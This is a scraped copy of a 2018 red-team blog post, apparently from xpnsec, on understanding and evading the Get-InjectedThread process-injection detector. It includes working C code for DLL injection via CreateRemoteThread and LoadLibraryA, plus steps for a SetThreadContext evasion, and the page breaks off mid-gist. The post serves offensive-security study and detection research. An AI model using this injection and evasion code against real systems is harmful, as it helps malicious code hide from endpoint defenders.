@@ -1,0 +1,1258 @@
+# https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/
+
+<!DOCTYPE html><html lang="en" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths" style=""><!-- Head tag -->
+
+
+<body id="top" class="">
+  <!-- Top Navigation Bar -->
+  
+
+  <!-- Social Media Bar -->
+  <div class="social-bar">
+    <div class="social-container">
+      <a href="https://twitter.com/_xpn_" class="social-link" target="_blank" rel="noopener" title="Twitter">
+        <i class="fa fa-twitter" aria-hidden="true"></i>
+        <span>Twitter</span>
+      </a>
+      <a href="https://github.com/xpn" class="social-link" target="_blank" rel="noopener" title="GitHub">
+        <i class="fa fa-github" aria-hidden="true"></i>
+        <span>GitHub</span>
+      </a>
+      <a href="https://linkedin.com/in/xpn" class="social-link" target="_blank" rel="noopener" title="LinkedIn">
+        <i class="fa fa-linkedin" aria-hidden="true"></i>
+        <span>LinkedIn</span>
+      </a>
+      <a href="https://blog.xpnsec.com/rss/" class="social-link" title="RSS Feed">
+        <i class="fa fa-rss" aria-hidden="true"></i>
+        <span>RSS</span>
+      </a>
+      <a href="https://www.instagram.com/xpnsecpub" class="social-link" target="_blank" rel="noopener" title="Instagram">
+        <i class="fa fa-instagram" aria-hidden="true"></i>
+        <span>Instagram</span>
+      </a>
+    </div>
+  </div>
+
+  <div class="home-template home">
+    <!--[if lt IE 8]>
+      <p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a target="_blank" rel="noopener" href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
+    <![endif]-->
+    <div class="container clearfix">
+      <main class="content" role="main">
+        <div class="post-template">
+  <article class="post">
+    <a class="btn" href="https://blog.xpnsec.com/" title="Back to homepage">« Back to home</a>
+
+<div class="post-hero">
+  <div class="post-hero-header">
+    <h1 class="post-hero-title">Understanding and Evading Get-InjectedThread</h1>
+  </div>
+  
+  
+    <div class="post-hero-image">
+      <img src="https://res.cloudinary.com/xpnsec/image/upload/images/2018/04/bypass3-1.png" alt="Understanding and Evading Get-InjectedThread">
+    </div>
+  
+  <div class="post-hero-date">
+      <span>Posted on </span><time>9th April 2018</time>
+  </div>
+  <hr>
+  <div class="post-hero-footer">
+    <div class="post-hero-meta">
+      <div class="post-hero-tags">
+        
+          <a href="https://blog.xpnsec.com/tags#redteam" class="tag-badge">redteam</a> <a href="https://blog.xpnsec.com/tags#windows" class="tag-badge">windows</a>
+        
+      </div>
+      <div class="post-hero-reading-time">
+        <i class="fa fa-clock-o" aria-hidden="true"></i> 7 min read
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<p>One of the many areas of this field that I really enjoy is the “cat and mouse” game played between RedTeam and BlueTeam, each forcing the other to up their game. Often we see some awesome tools being released to help defenders detect malware or shellcode execution, and knowing just how these defensive capabilities function is important when performing a successful pentest or RedTeam engagement.</p>
+<p>Recently I came across the awesome post “Defenders Think in Graphs Too!”, which can be found over on the SpectreOps blog <a target="_blank" rel="noopener" href="https://posts.specterops.io/defenders-think-in-graphs-too-part-1-572524c71e91">here</a>. This post is the start of a series looking at “data acquisition, data quality, and data analysis through a case study focused on detecting Process Injection”. If you haven’t read it, I highly recommend that you do.</p>
+<p>One of the tools discussed in the post is “Get-InjectedThread”, a Powershell script capable of enumerating running processes and displaying information on any that it believes have been victim to process injection. The tool can be found over on GitHub <a target="_blank" rel="noopener" href="https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2">here</a>.</p>
+<p>One thing I thought of when I saw this tool, was just how I would go about bypassing detection if I encountered it during an engagement. Also, with an interest in this area of Windows security, I really wanted a good starting point to build on when this detection technique evolves, either through the next iteration of <code>Get-InjectedThread</code>, or through other tools intergrating the same method. This post will go through a few different techniques to help us understand just how we could bypass this kind of analysis.</p>
+<h2 id="Can-we-avoid-detection"><a href="https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/#Can-we-avoid-detection" class="headerlink" title="Can we avoid detection?"></a>Can we avoid detection?</h2><p>Typically, when attempting to execute code in another process, the <code>VirtualAllocEx</code> -&gt; <code>WriteProcessMemory</code> -&gt; <code>CreateRemoteThread</code> chain is used. Let’s take a quick look at <code>Get-InjectedThread</code> in action, by first injecting shellcode into a process, and then running <code>Get-InjectedThread</code>:</p>
+<p><img src="https://res.cloudinary.com/xpnsec/image/upload/images/2018/04/get-injectedthread_example.png" alt="get-injectedthread_example"></p>
+<p>… I did say Get-InjectedThread was awesome didn’t I :).</p>
+<p>Here we see that shellcode injected into cmd.exe is caught and displayed to the user, giving an indication that something is suspicious.</p>
+<p>The way that <code>Get-InjectedThread</code> achieves this is by analysing running threads on a system. The memory associated with the start address of the thread is then enumerated, and if the memory is found to be missing the <code>MEM_IMAGE</code> flag, the tool indicates that the thread is likely running from dynamically allocated memory (most likely from a <code>VirtualAllocEx</code> call or similar), rather than being spawned from a DLL or EXE… pretty cool.</p>
+<p>Now, let’s review the code to see just how these checks are performed:</p>
+<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get</span>-<span class="hljs-title">InjectedThread</span>
+</span>{
+...
+$hSnapshot = CreateToolhelp32Snapshot -ProcessId <span class="hljs-number">0</span> -Flags <span class="hljs-number">4</span>
+
+$Thread = Thread32First -SnapshotHandle $hSnapshot
+<span class="hljs-keyword">do</span>
+{
+    $proc = Get-Process -Id $Thread.th32OwnerProcessId
+    
+    <span class="hljs-keyword">if</span>($Thread.th32OwnerProcessId -ne <span class="hljs-number">0</span> -<span class="hljs-keyword">and</span> $Thread.th32OwnerProcessId -ne <span class="hljs-number">4</span>)
+    {
+        $hThread = OpenThread -ThreadId $Thread.th32ThreadID -DesiredAccess $THREAD_ALL_ACCESS -InheritHandle $false
+        <span class="hljs-keyword">if</span>($hThread -ne <span class="hljs-number">0</span>)
+        {
+            $BaseAddress = NtQueryInformationThread -ThreadHandle $hThread
+            $hProcess = OpenProcess -ProcessId $Thread.th32OwnerProcessID -DesiredAccess $PROCESS_ALL_ACCESS -InheritHandle $false
+            
+            <span class="hljs-keyword">if</span>($hProcess -ne <span class="hljs-number">0</span>)
+            {
+                $memory_basic_info = VirtualQueryEx -ProcessHandle $hProcess -BaseAddress $BaseAddress
+                $AllocatedMemoryProtection = $memory_basic_info.AllocationProtect -<span class="hljs-keyword">as</span> $MemProtection
+                $MemoryProtection = $memory_basic_info.Protect -<span class="hljs-keyword">as</span> $MemProtection
+                $MemoryState = $memory_basic_info.State -<span class="hljs-keyword">as</span> $MemState
+                $MemoryType = $memory_basic_info.Type -<span class="hljs-keyword">as</span> $MemType
+                
+                <span class="hljs-keyword">if</span>($MemoryState -eq $MemState::MEM_COMMIT -<span class="hljs-keyword">and</span> $MemoryType -ne $MemType::MEM_IMAGE)
+                {   
+                ...
+</code></pre>
+<p>Reading the above, there are a number of areas that stand out. The first is:</p>
+<pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash">BaseAddress = NtQueryInformationThread -ThreadHandle <span class="hljs-variable">$hThread</span></span>
+</code></pre>
+<p>This command is responsible for retrieving the entry address of the running thread. When injecting shellcode, this would typically be the address provided to the <code>CreateRemoteThread</code> call. For example:</p>
+<pre><code class="hljs cpp">threadHandle = CreateRemoteThread(
+    processHandle, 
+    <span class="hljs-literal">NULL</span>, 
+    <span class="hljs-number">0</span>, 
+    BASE_ADDRESS, 
+    <span class="hljs-literal">NULL</span>, 
+    CREATE_SUSPENDED, 
+    <span class="hljs-literal">NULL</span>
+    );
+</code></pre>
+<p>The second interesting call is:</p>
+<pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash">memory_basic_info = VirtualQueryEx -ProcessHandle <span class="hljs-variable">$hProcess</span> -BaseAddress <span class="hljs-variable">$BaseAddress</span></span>
+</code></pre>
+<p>This line is making a call to the Win32 function <code>VirtualQueryEx</code>, which returns information on the memory allocation associated with the running thread’s base address. Information such as memory protection, length, flags etc..</p>
+<p>This information is then used in the following command:</p>
+<pre><code class="hljs php"><span class="hljs-keyword">if</span>($MemoryState -eq $MemState::MEM_COMMIT -<span class="hljs-keyword">and</span> $MemoryType -ne $MemType::MEM_IMAGE)
+</code></pre>
+<p>Here we see a final check to see if the thread’s base address has the <code>MEM_COMMIT</code> flag and is missing the <code>MEM_IMAGE</code> flag. If this is true, it is highly likely that this is a thread injected and running from dynamic memory, which the tool then highlights.</p>
+<p>With this in mind, let’s see if there are any methods in which we can bypass these checks, and stay under the radar during an assessment.</p>
+<h2 id="Inject-DLL-via-LoadLibrary"><a href="https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/#Inject-DLL-via-LoadLibrary" class="headerlink" title="Inject DLL via LoadLibrary"></a>Inject DLL via LoadLibrary</h2><p>The first way we will attempt to avoid being caught, is by adding our shellcode to a DLL, and then using <code>LoadLibraryA</code> as our entrypoint. By doing this we can bypass the following check, as our entry point is actually within <code>MEM_IMAGE</code> flagged memory:</p>
+<pre><code class="hljs php"><span class="hljs-keyword">if</span>($MemoryState -eq $MemState::MEM_COMMIT -<span class="hljs-keyword">and</span> $MemoryType -ne $MemType::MEM_IMAGE)
+</code></pre>
+<p>To target <code>LoadLibraryA</code>, we will need to complete the following steps:</p>
+<ol>
+<li>Get the address of the <code>LoadLibraryA</code> call.</li>
+<li>Allocate memory within our target process.</li>
+<li>Write the path of our DLL into the allocated memory.</li>
+<li>Make a call to start a new thread, with the entry point af <code>LoadLibraryA</code>, passing the DLL path memory address as an argument.</li>
+</ol>
+<p>This will look something like this:</p>
+
+<link rel="stylesheet" href="https://github.githubassets.com/assets/gist-embed-8703547f549b05ef.css"><div id="gist88862240" class="gist">
+    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
+      <div class="gist-data">
+        
+<div class="js-gist-file-update-container js-task-list-container">
+      <div id="file-get_injectedthread-example_dll-c" class="file my-2">
+    
+    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  " style="overflow: auto" tabindex="0" role="region" aria-label="get_injectedthread-example_dll.c content, created by xpn on 10:28PM on April 07, 2018.">
+
+        
+<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">
+
+  
+  <div data-view-component="true" class="flash flash-warn flash-full d-flex flex-items-center">
+  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
+    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
+</svg>
+    <span>
+      This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
+      <a class="Link--inTextBlock" href="https://github.co/hiddenchars" target="_blank">Learn more about bidirectional Unicode characters</a>
+    </span>
+
+
+  <div data-view-component="true" class="flash-action">        <a href="https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/" data-view-component="true" class="btn-sm btn">    Show hidden characters
+</a>
+</div>
+</div>
+
+  <span aria-label="This line has hidden Unicode characters" data-view-component="true" class="line-alert tooltipped tooltipped-e">
+    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
+    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
+</svg>
+</span>
+
+  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="get_injectedthread-example_dll.c">
+        <tbody><tr>
+          <td id="file-get_injectedthread-example_dll-c-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-smi">int</span> <span class="pl-en">example_loadlibrary</span>(<span class="pl-smi">int</span> <span class="pl-s1">pid</span>) {</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC2" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC3" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">char</span> <span class="pl-s1">currentDir</span>[<span class="pl-c1">MAX_PATH</span>];</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC4" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">SIZE_T</span> <span class="pl-s1">bytesWritten</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC5" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC6" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">HANDLE</span> <span class="pl-s1">processHandle</span> <span class="pl-c1">=</span> <span class="pl-en">OpenProcess</span>(<span class="pl-c1">PROCESS_ALL_ACCESS</span>, false, <span class="pl-s1">pid</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC7" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (<span class="pl-s1">processHandle</span> <span class="pl-c1">==</span> <span class="pl-c1">INVALID_HANDLE_VALUE</span>) {</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L8" class="blob-num js-line-number js-blob-rnum" data-line-number="8"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC8" class="blob-code blob-code-inner js-file-line">		<span class="pl-en">printf</span>(<span class="pl-s">"[X] Error: Could not open process with PID %d\n"</span>, <span class="pl-s1">pid</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L9" class="blob-num js-line-number js-blob-rnum" data-line-number="9"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC9" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-c1">1</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L10" class="blob-num js-line-number js-blob-rnum" data-line-number="10"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC10" class="blob-code blob-code-inner js-file-line">	}</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L11" class="blob-num js-line-number js-blob-rnum" data-line-number="11"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC11" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L12" class="blob-num js-line-number js-blob-rnum" data-line-number="12"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC12" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">void</span> <span class="pl-c1">*</span><span class="pl-s1">alloc</span> <span class="pl-c1">=</span> <span class="pl-en">VirtualAllocEx</span>(<span class="pl-s1">processHandle</span>, <span class="pl-c1">0</span>, <span class="pl-c1">4096</span>, <span class="pl-c1">MEM_COMMIT</span> | <span class="pl-c1">MEM_RESERVE</span>, <span class="pl-c1">PAGE_READWRITE</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L13" class="blob-num js-line-number js-blob-rnum" data-line-number="13"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC13" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (<span class="pl-s1">alloc</span> <span class="pl-c1">==</span> <span class="pl-c1">NULL</span>) {</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L14" class="blob-num js-line-number js-blob-rnum" data-line-number="14"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC14" class="blob-code blob-code-inner js-file-line">		<span class="pl-en">printf</span>(<span class="pl-s">"[X] Error: Could not allocate memory in process\n"</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L15" class="blob-num js-line-number js-blob-rnum" data-line-number="15"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC15" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-c1">1</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L16" class="blob-num js-line-number js-blob-rnum" data-line-number="16"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC16" class="blob-code blob-code-inner js-file-line">	}</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L17" class="blob-num js-line-number js-blob-rnum" data-line-number="17"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC17" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L18" class="blob-num js-line-number js-blob-rnum" data-line-number="18"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC18" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">void</span> <span class="pl-c1">*</span><span class="pl-s1">_loadLibrary</span> <span class="pl-c1">=</span> <span class="pl-en">GetProcAddress</span>(<span class="pl-en">LoadLibraryA</span>(<span class="pl-s">"kernel32.dll"</span>), <span class="pl-s">"LoadLibraryA"</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L19" class="blob-num js-line-number js-blob-rnum" data-line-number="19"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC19" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (<span class="pl-s1">_loadLibrary</span> <span class="pl-c1">==</span> <span class="pl-c1">NULL</span>) {</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L20" class="blob-num js-line-number js-blob-rnum" data-line-number="20"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC20" class="blob-code blob-code-inner js-file-line">		<span class="pl-en">printf</span>(<span class="pl-s">"[X] Error: Could not find address of LoadLibrary\n"</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L21" class="blob-num js-line-number js-blob-rnum" data-line-number="21"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC21" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-c1">1</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L22" class="blob-num js-line-number js-blob-rnum" data-line-number="22"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC22" class="blob-code blob-code-inner js-file-line">	}</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L23" class="blob-num js-line-number js-blob-rnum" data-line-number="23"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC23" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L24" class="blob-num js-line-number js-blob-rnum" data-line-number="24"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC24" class="blob-code blob-code-inner js-file-line">	<span class="pl-en">GetCurrentDirectoryA</span>(<span class="pl-c1">MAX_PATH</span>, <span class="pl-s1">currentDir</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L25" class="blob-num js-line-number js-blob-rnum" data-line-number="25"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC25" class="blob-code blob-code-inner js-file-line">	<span class="pl-en">strncat_s</span>(<span class="pl-s1">currentDir</span>, <span class="pl-s">"\\injectme.dll"</span>, <span class="pl-c1">MAX_PATH</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L26" class="blob-num js-line-number js-blob-rnum" data-line-number="26"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC26" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L27" class="blob-num js-line-number js-blob-rnum" data-line-number="27"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC27" class="blob-code blob-code-inner js-file-line">	<span class="pl-en">printf</span>(<span class="pl-s">"[*] Injecting path to load DLL: %s\n"</span>, <span class="pl-s1">currentDir</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L28" class="blob-num js-line-number js-blob-rnum" data-line-number="28"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC28" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L29" class="blob-num js-line-number js-blob-rnum" data-line-number="29"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC29" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (!<span class="pl-en">WriteProcessMemory</span>(<span class="pl-s1">processHandle</span>, <span class="pl-s1">alloc</span>, <span class="pl-s1">currentDir</span>, <span class="pl-en">strlen</span>(<span class="pl-s1">currentDir</span>) <span class="pl-c1">+</span> <span class="pl-c1">1</span>, <span class="pl-c1">&amp;</span><span class="pl-s1">bytesWritten</span>)) {</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L30" class="blob-num js-line-number js-blob-rnum" data-line-number="30"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC30" class="blob-code blob-code-inner js-file-line">		<span class="pl-en">printf</span>(<span class="pl-s">"[X] Error: Could not write into process memory\n"</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L31" class="blob-num js-line-number js-blob-rnum" data-line-number="31"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC31" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-c1">2</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L32" class="blob-num js-line-number js-blob-rnum" data-line-number="32"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC32" class="blob-code blob-code-inner js-file-line">	}</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L33" class="blob-num js-line-number js-blob-rnum" data-line-number="33"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC33" class="blob-code blob-code-inner js-file-line">	<span class="pl-en">printf</span>(<span class="pl-s">"[*] Written %d bytes\n"</span>, <span class="pl-s1">bytesWritten</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L34" class="blob-num js-line-number js-blob-rnum" data-line-number="34"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC34" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L35" class="blob-num js-line-number js-blob-rnum" data-line-number="35"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC35" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (<span class="pl-en">CreateRemoteThread</span>(<span class="pl-s1">processHandle</span>, <span class="pl-c1">NULL</span>, <span class="pl-c1">0</span>, (<span class="pl-smi">LPTHREAD_START_ROUTINE</span>)<span class="pl-s1">_loadLibrary</span>, <span class="pl-s1">alloc</span>, <span class="pl-c1">0</span>, <span class="pl-c1">NULL</span>) <span class="pl-c1">==</span> <span class="pl-c1">NULL</span>) {</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L36" class="blob-num js-line-number js-blob-rnum" data-line-number="36"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC36" class="blob-code blob-code-inner js-file-line">		<span class="pl-en">printf</span>(<span class="pl-s">"[X] Error: CreateRemoteThread failed [%d] :(\n"</span>, <span class="pl-en">GetLastError</span>());</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L37" class="blob-num js-line-number js-blob-rnum" data-line-number="37"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC37" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-c1">2</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L38" class="blob-num js-line-number js-blob-rnum" data-line-number="38"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC38" class="blob-code blob-code-inner js-file-line">	}</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_dll-c-L39" class="blob-num js-line-number js-blob-rnum" data-line-number="39"></td>
+          <td id="file-get_injectedthread-example_dll-c-LC39" class="blob-code blob-code-inner js-file-line">}</td>
+        </tr>
+  </tbody></table>
+</div>
+
+
+    </div>
+
+  </div>
+
+</div>
+
+      </div>
+      <div class="gist-meta">
+        <a href="https://gist.github.com/xpn/0046ea13c828ddcacadd38d01f07b63d/raw/ed655d6f286bc11aae008b464f2f5098f20253d8/get_injectedthread-example_dll.c" style="float:right" class="Link--inTextBlock">view raw</a>
+        <a href="https://gist.github.com/xpn/0046ea13c828ddcacadd38d01f07b63d#file-get_injectedthread-example_dll-c" class="Link--inTextBlock">
+          get_injectedthread-example_dll.c
+        </a>
+        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
+      </div>
+    </div>
+</div>
+
+
+
+<p>Let’s give this a shot by making a call to <code>MessageBoxA</code> from our injected DLL:</p>
+<p><img src="https://res.cloudinary.com/xpnsec/image/upload/images/2018/04/bypass1.png" alt="bypass1"></p>
+<p>Here we see that we have successfully injected our shellcode into cmd.exe, which launches the message box. More so, we are not picked up during <code>Get-InjectedThread</code>‘s run.</p>
+<p>There is of course an obvious weakness to this technique, in that we need to drop a DLL onto disk to perform injection, increasing our shellcode’s chances of being discovered… however it’s a good starting point.</p>
+<p>Let’s see if we can do anything else.</p>
+<h2 id="SetThreadContext"><a href="https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/#SetThreadContext" class="headerlink" title="SetThreadContext"></a>SetThreadContext</h2><p>We now know that a good way to stay under the radar is to have our thread’s entry address set to a memory region containing the <code>MEM_IMAGE</code> flag. But what about if we update the entrypoint of our thread just before starting, would this be enough to evade detection?</p>
+<p>In this example, we will look to leverage the <code>SetThreadContext</code> call to redirect execution to our injected shellcode, using the following steps:</p>
+<ol>
+<li>Allocate memory in the target process to hold our shellcode.</li>
+<li>Copy our shellcode into the allocated memory.</li>
+<li>Spawn a suspended thread, with the ThreadProc set to any <code>MEM_IMAGE</code> flagged memory region.</li>
+<li>Retrieve the current registers for the suspended thread.</li>
+<li>Update the RIP register to point to our shellcode residing in allocated memory.</li>
+<li>Resume execution.</li>
+</ol>
+<p>The theory here is that our thread’s base address will be that of a <code>MEM_IMAGE</code> flagged memory region, even though we never actually execute code from this address. Then by setting the <code>rip</code> register to point to our shellcode, we achieve execution whilst hopefully bypassing <code>Get-InjectedThread</code>. Our code will look like this:</p>
+
+<link rel="stylesheet" href="https://github.githubassets.com/assets/gist-embed-8703547f549b05ef.css"><div id="gist88862263" class="gist">
+    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
+      <div class="gist-data">
+        
+<div class="js-gist-file-update-container js-task-list-container">
+      <div id="file-get_injectedthread-example_setthreadcontext-c" class="file my-2">
+    
+    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  " style="overflow: auto" tabindex="0" role="region" aria-label="get_injectedthread-example_setthreadcontext.c content, created by xpn on 10:30PM on April 07, 2018.">
+
+        
+<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">
+
+  
+  <div data-view-component="true" class="flash flash-warn flash-full d-flex flex-items-center">
+  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
+    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
+</svg>
+    <span>
+      This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
